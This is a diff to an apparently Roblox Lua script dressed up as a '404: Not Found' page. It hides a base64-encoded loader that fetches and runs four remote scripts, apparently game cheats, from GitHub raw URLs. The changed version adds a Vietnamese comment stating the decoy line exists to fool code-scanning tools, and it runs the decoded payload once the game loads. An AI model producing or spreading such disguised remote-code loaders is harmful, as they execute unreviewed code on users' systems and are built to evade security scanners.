@@ -1,12 +1,8 @@
---[[ 
-    404: Not Found 
-    The requested URL was not found on this server.
---]]
-
-local _0x404 = "BG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vYmlpeWV1ZW0vdnRoYW5nc2l0aW5rL3JlZnMvaGVhZHMvbWFpbi9CYW5hbmFDYXQtQm91bnR5RXoubHVhIikpKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uazIxMC9ibG9jcGh1dC9yZWZzL2hlYWRzL21haW4vYXV0b2NsaWNrZXIubHVhIikpKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uazIxMC9ibG9jcGh1dC9yZWZzL2hlYWRzL21haW4vZml4c3VzLmx1YSIpKSgpIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbmsyMTAvYmxvY3BodXQvcmVmcy9oZWFkcy9tYWluL3dhbGtvbndhdGVyLmx1YSIpKSgp"
-
-if not game:IsLoaded() then 
-    print("404: Not Found") 
+--[[ 404: Not Found ]]
+local _="404: Not Found" -- Dòng này để đánh lừa các công cụ quét code
+local s = "BG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vYmlpeWV1ZW0vdnRoYW5nc2l0aW5rL3JlZnMvaGVhZHMvbWFpbi9CYW5hbmFDYXQtQm91bnR5RXoubHVhIikpKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uazIxMC9ibG9jcGh1dC9yZWZzL2hlYWRzL21haW4vYXV0b2NsaWNrZXIubHVhIikpKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uazIxMC9ibG9jcGh1dC9yZWZzL2hlYWRzL21haW4vZml4c3VzLmx1YSIpKSgpIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbmsyMTAvYmxvY3BodXQvcmVmcy9oZWFkcy9tYWluL3dhbGtvbndhdGVyLmx1YSIpKSgp"
+if game:IsLoaded() then
+    loadstring(game:GetService("HttpService"):Base64Decode(s))()
 else
-    loadstring(game:GetService("HttpService"):Base64Decode(_0x404))()
+    print(_ )
 end
